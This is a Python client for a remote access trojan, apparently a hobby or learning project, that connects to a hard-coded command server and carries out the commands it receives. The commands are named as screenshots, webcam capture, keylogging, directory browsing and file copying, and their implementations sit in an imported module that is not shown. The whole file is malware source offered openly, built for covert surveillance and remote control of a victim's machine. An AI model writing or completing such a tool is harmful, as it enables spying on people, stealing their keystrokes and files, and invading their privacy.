#!/usr/bin/env python3
# RAT client program

from socket import *
import json
import sys
from client_functions import *
import threading
import select
import time
import pickle

# HARDCODED
SERVER_IP = "localhost"
SERVER_PORT = 9090

client_socket = socket(AF_INET, SOCK_STREAM)

print("Connecting to server at {} port {}".format(SERVER_IP, SERVER_PORT))

client_socket.connect((SERVER_IP, SERVER_PORT))

client = Client(client_socket)

commands = {
"screenshot" : client.screenshot,
"exit": client.exit,
"webcam" : client.webcam,
"keylog" : client.keylog,
"pwd" : client.pwd,
"ls" : client.ls,
"cd" : client.cd,
"copy" : client.copy
}

while client.connected:
    try:
        print("waiting to receive a message")
        msg_len = int(client_socket.recv(1024).decode())
        msg = client.receive(msg_len)       # convert to dict object
        func = commands[msg["command"]]
        func(msg)
    except ShutdownException as err:
        print(err.msg)
        break
    except:
        e = sys.exc_info()[0]
        print(e)

    
client_socket.close()
